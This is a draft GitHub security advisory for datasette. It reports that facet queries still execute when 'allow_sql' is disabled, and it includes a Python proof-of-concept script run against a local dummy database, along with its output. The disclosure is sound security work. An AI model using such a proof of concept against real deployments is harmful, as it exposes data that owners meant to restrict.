# GitHub Security Advisory 제출 본문
# https://github.com/simonw/datasette/security/advisories/new

---

## Title
`allow_sql: false` does not prevent SQL execution via `?_facet=` parameter

---

## Body

Hi Simon,

I noticed something that might be a missing permission check — wanted to flag it
in case it's not intentional.

When `default_allow_sql` is set to `false`, `?_where=` is correctly blocked with
a 403. However, the same configuration doesn't seem to affect `?_facet=` — facet
queries still execute SQL and return results.

I put together a small PoC to confirm the behavior:

```
[Test 1] GET /demo/public_data.json?_where=1=1
         Settings: default_allow_sql=False, allow_facet=True
         HTTP 403 Forbidden   ← correctly blocked

[Test 2] GET /demo/public_data.json?_facet=category
         Settings: default_allow_sql=False, allow_facet=True
         HTTP 200             ← SQL executes despite allow_sql:false

[Test 3] GET /demo/public_data.json?_facet=category
         Settings: default_allow_sql=False, allow_facet=False
         HTTP 400             ← only blocked when allow_facet is also disabled

[Test 4] GET /demo/secret_tokens.json?_facet=token
         Settings: default_allow_sql=False, allow_facet=True
         HTTP 200
         LEAKED -> token='sk-abc123'  (count=1)
         LEAKED -> token='sk-xyz789'  (count=1)
```

The inconsistency between `?_where=` and `?_facet=` is what caught my eye —
`filters.py:16-21` applies the `execute-sql` permission check for `_where=`,
but `facets.py:238` calls `ds.execute()` directly without an equivalent check.

A few things I'm not sure about:
- Is this intentional? If `allow_sql` is scoped only to the SQL editor UI and
  facets are considered a separate, controlled feature, I may have misunderstood
  the intended security model.
- The documentation for `default_allow_sql` describes it as preventing
  "arbitrary SQL execution," but doesn't mention that facets remain active.
  That's what led me to think this might be unintentional.

This appears to be separate from Issue #2677 / PR #2690 (which address identifier
quoting in `escape_sqlite()`). PR #2690 is still open and doesn't add a permission
gate to `facets.py`.

Happy to provide more details or adjust the PoC if helpful. And if this is
working as designed, I'd love to understand the intended model — I'll update
my own understanding of how `allow_sql` interacts with facets.

Thanks for your work on datasette.

---

## Severity (suggested)
Medium to High — though I'd defer to your judgement on the actual rating.

## Affected versions
All versions with facet support (confirmed on 1.0a30 / 1.0a31).

---

## PoC Script

```python
"""
PoC: datasette `allow_sql: false` bypass via ?_facet= parameter
Distinct from Issue #2677 / PR #2690 (identifier injection).

This script demonstrates CWE-285 (Improper Authorization):
facet_results() executes SQL without checking execute-sql permission,
allowing bypass of the allow_sql:false security boundary.

Tested on: datasette 1.0a30, Python 3.13

Usage:
    pip install datasette httpx anyio
    python poc.py
"""

import asyncio
import sqlite3
import subprocess
import tempfile
import os
import sys

import httpx
from datasette.app import Datasette

import datasette as _ds
print(f"datasette version: {_ds.__version__}")
print()


async def run_poc():
    tmp = tempfile.mkdtemp()
    db_path = os.path.join(tmp, "demo.db")

    conn = sqlite3.connect(db_path)
    conn.execute("CREATE TABLE public_data (id INTEGER PRIMARY KEY, category TEXT)")
    conn.execute("CREATE TABLE secret_tokens (id INTEGER PRIMARY KEY, token TEXT, owner TEXT)")
    conn.executemany("INSERT INTO public_data VALUES (?,?)", [(1, "A"), (2, "B"), (3, "A")])
    conn.executemany("INSERT INTO secret_tokens VALUES (?,?,?)",
                     [(1, "sk-abc123", "admin"), (2, "sk-xyz789", "alice")])
    conn.commit()
    conn.close()

    db_name = "demo"

    # Test 1: ?_where= is correctly blocked (baseline)
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": True})
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver") as client:
        r = await client.get(f"/{db_name}/public_data.json", params={"_where": "1=1"})
        print(f"[Test 1] GET /demo/public_data.json?_where=1=1")
        print(f"         Settings: default_allow_sql=False, allow_facet=True")
        print(f"         HTTP {r.status_code} {'Forbidden' if r.status_code == 403 else r.text[:80]}")
        assert r.status_code == 403
        print()

    # Test 2: ?_facet= bypasses allow_sql:false
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": True})
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver") as client:
        r = await client.get(f"/{db_name}/public_data.json", params={"_facet": "category"})
        data = r.json()
        facets = data.get("facet_results", {}).get("results", {})
        print(f"[Test 2] GET /demo/public_data.json?_facet=category")
        print(f"         Settings: default_allow_sql=False, allow_facet=True")
        print(f"         HTTP {r.status_code}")
        for col, info in facets.items():
            print(f"         facet [{col}]:  {[(x['value'], x['count']) for x in info['results']]}")
        assert r.status_code == 200
        print()

    # Test 3: allow_facet:false is a separate, unrelated setting
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": False})
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver") as client:
        r = await client.get(f"/{db_name}/public_data.json", params={"_facet": "category"})
        print(f"[Test 3] GET /demo/public_data.json?_facet=category")
        print(f"         Settings: default_allow_sql=False, allow_facet=False")
        print(f"         HTTP {r.status_code}")
        assert r.status_code == 400
        print()

    # Test 4: restricted table data leaked via ?_facet=
    ds = Datasette([db_path], settings={"default_allow_sql": False, "allow_facet": True})
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=ds.app()), base_url="http://testserver") as client:
        r = await client.get(f"/{db_name}/secret_tokens.json", params={"_facet": "token"})
        data = r.json()
        facets = data.get("facet_results", {}).get("results", {})
        print(f"[Test 4] GET /demo/secret_tokens.json?_facet=token")
        print(f"         Settings: default_allow_sql=False, allow_facet=True")
        print(f"         HTTP {r.status_code}")
        for col, info in facets.items():
            for row in info["results"]:
                print(f"         LEAKED -> token={row['value']!r}  (count={row['count']})")
        assert r.status_code == 200


if __name__ == "__main__":
    try:
        import httpx  # noqa: F401
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "httpx", "anyio", "-q"], check=True)
    asyncio.run(run_poc())
```
